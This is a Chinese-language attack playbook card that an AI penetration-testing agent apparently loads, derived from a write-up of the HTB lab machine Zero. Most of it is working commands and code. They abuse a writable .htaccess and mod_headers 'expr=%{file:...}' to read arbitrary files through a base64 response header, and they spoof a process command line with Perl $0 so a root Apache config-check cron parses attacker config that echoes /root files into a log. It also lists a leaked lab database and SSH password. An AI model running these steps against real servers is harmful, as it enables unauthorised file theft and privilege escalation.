---
name: 'apache-htaccess-abuse'
description: 'web 根下有你可写的 .htaccess（或任何 Apache 目录级配置）、能上传/SFTP 写入却不能执行代码、站点是 `/~user/` 的 Apache UserDir 时加载：mod_headers 表达式 `expr=%{file:...}` 任意文件读，base64 后从响应头 X-Leak 取回；以及 root 周期跑的 Apache 配置完整性校验 cron 被满足 pgrep 条件后注入被恢复配置的提权链。坑：写 .htaccess 会改站点行为，先备份再 rm+put。（检索词：htaccess/.htaccess/mod_headers/mod headers/mod-headers/Header always set/expr=%{file:/%{file:/file:/arbitrary file read/arbitrary-file-read/任意文件读/任意读/AllowOverride/FileInfo/Apache 配置/Apache-配置/X-Leak/base64 响应头/base64 头外带/配置完整性/配置完整性校验/cron 配置恢复/配置恢复/apache2ctl/pgrep -f/Include 注入/UserDir/abuse）'
whenToUse: '上传或 SFTP 落到一个含 .htaccess 的 web 目录，或拿到 shell 后看到 root 周期执行的 Apache 配置校验脚本时。'
metadata: { domain: web, tier: T2 }
---

# 可写 .htaccess → mod_headers 表达式任意文件读

> 来自 Insane 官方 WP 逐台回核,**1 台命中**:Zero

## 触发信号

| 可观察现象 | 说明 |
|---|---|
| SFTP/FTP/上传给出「个人网页目录」，`ls -lah` 见 `.htaccess` + `index.html` | 目录级配置可写 = 攻击面 |
| `nmap` 报 `Apache httpd 2.4.41 ((Ubuntu))`，访问形如 `http://zero.vl/~zro-9c53d89c/` | `~user` UserDir 生效面 |
| 能写文件但目录里放 PHP 不执行 | 拿不到 webshell，但目录级配置仍可改 |
| `pspy64` 里 UID=0 反复出现 `/usr/bin/bash /usr/local/bin/zro.web-confcheck` | 配置完整性 cron 的形态 |
| 脚本里 `pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf"` | 盲信 cmdline = 参数注入点 |

## 前置验证

```bash
sftp zro-9c53d89c@zero.vl
sftp> cd public_html; ls -lah
# -rw-r--r--  ? 0 0  49B .htaccess          ← root 所有，但目录可写
sftp> get .htaccess          # 必须先备份（后面要 rm+put 覆盖）
$ cat .htaccess
# Header always set X-Zero-Customer 'zro-9c53d89c'
# # Example:
# Header set foo-checksum "expr=%{md5:foo}"

# 先自检表达式真的在求值（官方文档给的例子）
$ echo 'Header set foo-checksum "expr=%{md5:foo}"' >> .htaccess
$ curl -I http://zero.vl/~zro-9c53d89c/
# foo-checksum: acbd18db4cc2f85cedef654fccc4a4d8   ← md5("foo")
```

## 模式 1: `expr=%{file:...}` 任意文件读（响应头外带）

条件：web 根下有你可写的 `.htaccess`，且 `AllowOverride` 放行 `Header`（FileInfo 类）。
🔴 这一条是 **Apache 通用前提**,Zero 的 WP 只 dump 出 `AllowOverride None` 的三个块(`<Directory />`、`/usr/share`、`/var/www/`),**没有**直接证明 exploited 的 `public_html` 取值 —— 实际以"写进去 `curl -I` 看有没有新响应头"为准,别因看到 None 就提前放弃。
数据只能从**响应头**取回。

```bash
$ echo 'Header always set X-Leak "expr=%{base64:%{file:/etc/passwd}}"' >> .htaccess
$ curl -I http://zero.vl/~zro-9c53d89c/
HTTP/1.1 200 OK
X-Leak:
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbg...
```

批量读源码（WP 原样；f-string 里 Apache 的 `{` `}` 要写成 `{{` `}}`）：

```python
f.write(f'Header always set X-Leak "expr=%{{base64:%{{file:{filename}}}}}"')
sftp_upload('zero.vl', 22, 'zro-9c53d89c', '32286c39',
            '/tmp/.htaccess', 'public_html/.htaccess')
print(base64.b64decode(requests.get("http://zero.vl/~zro-9c53d89c/").headers['X-Leak']).decode())
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Zero | 读 `/var/www/html/stats.php` 泄出 `$mysqli = new mysqli("localhost", "zroadmin", "correct-horse-battery-staple", "zro");` → SSH `zroadmin:correct-horse-battery-staple` |

## 模式 2: mod_headers 表达式函数索引

| 函数 | 用法 | 说明 |
|---|---|---|
| `file` | `%{file:/etc/passwd}` | 读文件内容，**含行尾** |
| `base64` | `%{base64:...}` | base64 编码，外带必需 |
| `md5`(WP 实测) / `sha1` 等其它摘要函数(通用知识,未实测) | `%{md5:foo}` | 摘要，自检用（= `acbd18db4cc2f85cedef654fccc4a4d8`） |

🔴 **为什么必须套 base64**：`file` 保留换行，裸内容进 header 会破坏 HTTP 头（截断/报错/被 curl 拒收）；
base64 是单行安全字符集，取回端 `base64 -d` 还原。非 ASCII、`:`、空格同理。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Zero | 先 `expr=%{md5:foo}` 确认求值，再换 `base64` + `file`；`always` 保证错误响应也带该头 |

## 模式 3: 配置完整性 cron —— 满足 pgrep 条件注入被恢复的配置

条件：root 周期跑「校验 Apache 配置」的脚本，而它**盲信进程命令行**。Zero 的 `/usr/local/bin/zro.web-confcheck`：

```bash
while read pid _cmd ; do
  # Replace apache2 with apache2ctl and add -t for test
  cmd="${_cmd/apache2/apache2ctl} -t"
  $cmd >/dev/null 2>&1
  RET=$?
done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
```

pgrep `-f` 匹配整条 cmdline 且是**正则**（`.` 是通配）。只要起一个 cmdline 命中该正则、又**多带自己参数**的
进程即可（`$0` 改写就够，不需要真的 apache2 二进制）。WP 用 `Include` 当读原语。

```bash
# ① 抄配置目录投毒：首行插 Include，删掉 ${APACHE_LOG_DIR} 之类会报错的变量行
$ cp -r /etc/apache2/ ~/apache2
# ~/apache2/apache2.conf 第 1 行:  Include /root/root.txt

# ② 伪装进程名 + 多带 -d / -E，让 root 的 apache2ctl -t 去解析我们那份配置
$ cat > root.pl <<'EOF'
#!/usr/bin/perl
$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E log.txt";
sleep(100000);
EOF
$ perl root.pl
$ tail -f log.txt
AH00526: Syntax error on line 1 of /root/root.txt: Invalid command 'xxxxxxxxxxxxxxxxxxxxx',
perhaps misspelled or defined by a module not included in the server configuration
```

机理：`apache2ctl -t` 把 `Include /root/root.txt` 当配置解析 → 语法错误消息把该文件**第 1 行**回显到
`-E` 指定的日志。所以这条链**逐行读**（每次改配置重跑）；`-E log.txt` 是回显通道，`sleep` 为活到下次检查。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Zero | pspy64 见 UID=0 的 `/usr/bin/bash /usr/local/bin/zro.web-confcheck`；`Include /root/root.txt` + Perl `$0` 伪装 + 追加 `-d /home/zroadmin/apache2 -E log.txt` |

## 模式 4: 🔴 坑 —— 写 `.htaccess` 会改变站点行为

- 覆盖式 put 会丢掉原有行 → 站点行为变了；先 `get` 备份，回传用 `rm` + `put`（应用脚本也是
  `sftp.remove()` 再 `sftp.put()`），(WP 的做法就是 `sftp.remove()` 再 `sftp.put()`;先删再传比赌 put 覆盖更稳。)
- 语法写坏 → 整目录 500，**你连自己的访问路径都没了**（curl 拿不到头 = 读通道断）。收尾还原备份。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Zero | 原始 `.htaccess` 仅 49B（`Header always set X-Zero-Customer 'zro-9c53d89c'` + `# Example:` + `Header set foo-checksum "expr=%{md5:foo}"`）；流程 = `get` → 本地追加 → `rm` + `put` |

## 快速检查清单

```bash
[ ] 上传/SFTP/任意写能落到 web 根？目录里有 .htaccess / index.html？
[ ] AllowOverride 是 None 还是 FileInfo？(None → Header 指令不生效，放弃)
[ ] 先 `expr=%{md5:foo}` 自检，看到 acbd18db4cc2f85cedef654fccc4a4d8 再上 file
[ ] `Header always set X-Leak "expr=%{base64:%{file:/etc/passwd}}"` + `curl -I`
[ ] 读 app 源码 → 硬编码凭据（stats.php / config / db）
[ ] pspy64 找 root 周期脚本；pgrep -lfa 是否盲信 cmdline？
[ ] 原始 .htaccess 备份了吗 / 收尾还原了吗
```

## 教训

1. **`expr=%{file:...}` 是完整的任意文件读原语** —— `.htaccess` 可写 + `AllowOverride` 放行 `Header` 即任意读。
   防御：`AllowOverride None` 或禁掉 mod_headers 表达式求值。
2. **数据出口决定编码**：HTTP 头装不下换行/二进制，`base64` 不是可选而是必须；取回端 `base64 -d` 还原。
3. **先自检再打**：`expr=%{md5:foo}` 一行区分「写进去了」和「mod_headers 没求值」。
4. **root 脚本盲信 `pgrep -f` 的 cmdline = 参数注入** —— 正则里 `.` 是通配，`$0` 可伪造进程名；
   关键不是进程真不真，而是「命令行匹配正则 + 多带自己的参数」。
5. **配置校验脚本的报错回显就是文件读通道**：`Include` 任意文件 → 语法错误消息逐行吐到你能读的日志。

## 相关卡

- `waf-filter-bypass-patterns` —— `.htaccess 改写` 属那边的「规则层」绕过面，被 WAF 拦时转过去
- `web-attacks` —— 还没定位到 `.htaccess` 这一层时的 Web 总入口（上传/LFI/源码泄露）
- `cron-privesc-patterns` —— 拿到 shell 后按 cron 模式库排查；模式 3 是其「盲信 cmdline」特例
- `credential-hunting-locations` —— 模式 1 读出源码后系统化找下一组凭据
- `log-poisoning-lfi-rce` —— 从「读文件」升级到「执行」时的相邻 LFI 路线
- `command-safety-red-lines` —— 覆盖 `.htaccess` / 伪造 root 脚本进程前的可逆性检查
